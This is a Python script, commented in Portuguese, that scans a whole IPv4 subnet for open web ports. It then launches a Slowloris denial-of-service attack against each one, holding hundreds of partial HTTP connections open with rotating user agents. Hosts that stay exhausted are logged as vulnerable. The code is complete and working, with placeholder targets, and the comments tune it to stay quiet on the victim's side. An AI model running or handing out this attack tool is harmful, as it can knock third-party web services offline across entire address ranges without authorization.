import socket
import time
import random
import logging
from ipaddress import IPv4Network
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configurações do ataque
subnet = "IP"
portas = [PORTA1, PORTA2, PORTA3, ...]
num_sockets = 200 # quantidade ideal de sockets para não gerar muitos ruídos no lado de quem recebe o ataque
timeout_verificacao = 3
tempo_ataque = 120  # em segundos
max_threads = 50
saida_arquivo = "resultado_slowloris.txt"

logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.INFO,
)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.3 Safari/602.3.12",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
]


def ip_ativo(ip):
    try:
        socket.setdefaulttimeout(timeout_verificacao)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 80))
        s.close()
        return True
    except:
        return False


def porta_ativa(ip, porta):
    try:
        socket.setdefaulttimeout(timeout_verificacao)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, porta))
        s.send(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % ip.encode())
        resposta = s.recv(1024).decode(errors='ignore')
        s.close()
        if "404" in resposta:
            return False
        return True
    except:
        return False


def criar_socket(ip, porta):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, porta))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
        ua = random.choice(user_agents)
        s.send(f"User-Agent: {ua}\r\n".encode())
        s.send(b"Accept-language: en-US,en,q=0.5\r\n")
        return s
    except:
        return None


def testar_slowloris(ip, porta):
    logging.info(f"[+] Testando {ip}:{porta} com Slowloris")
    sockets = []
    total_recriacoes = 0

    for _ in range(num_sockets):
        s = criar_socket(ip, porta)
        if s:
            sockets.append(s)

    if len(sockets) < num_sockets:
        logging.info(f"[-] Não foi possível criar todos os {num_sockets} sockets iniciais para {ip}:{porta}.")
        return ""

    inicio = time.time()
    while time.time() - inicio < tempo_ataque:
        recriados = 0
        for s in list(sockets):
            try:
                s.send(b"X-a: keep-alive\r\n")
            except:
                sockets.remove(s)
                s_novo = criar_socket(ip, porta)
                if s_novo:
                    sockets.append(s_novo)
                recriados += 1
        total_recriacoes += recriados

        logging.info(
            f"[{ip}:{porta}] Creating sockets: {len(sockets)}/{num_sockets} | Recriados neste ciclo: {recriados}")
        time.sleep(10)

    for s in sockets:
        try:
            s.close()
        except:
            pass

    if total_recriacoes == 0:
        resultado = f"[VULNERAVEL] {ip}:{porta} - manteve 100% dos sockets por {tempo_ataque} segundos\n"
        logging.info(resultado.strip())
        return resultado
    else:
        logging.info(f"[SEGURO] {ip}:{porta} - {total_recriacoes} sockets precisaram ser recriados")
        return ""


def processar_ip(ip):
    resultados = []
    if not ip_ativo(ip):
        logging.info(f"[-] IP inativo: {ip}")
        return resultados
    for porta in portas:
        if porta_ativa(ip, porta):
            resultado = testar_slowloris(ip, porta)
            if resultado:
                resultados.append(resultado)
        else:
            logging.info(f"[-] Porta {porta} inativa em {ip}")
    return resultados


def main():
    resultados_finais = []
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(processar_ip, str(ip)): str(ip) for ip in IPv4Network(subnet)}
        for future in as_completed(futures):
            try:
                resultados = future.result()
                resultados_finais.extend(resultados)
            except Exception as e:
                logging.error(f"Erro ao processar {futures[future]}: {e}")
    if resultados_finais:
        with open(saida_arquivo, "w") as f:
            f.writelines(resultados_finais)
        logging.info(f"[+] Resultados salvos em {saida_arquivo}")
    else:
        logging.info("[+] Nenhuma vulnerabilidade encontrada.")


if __name__ == "__main__":
    main()
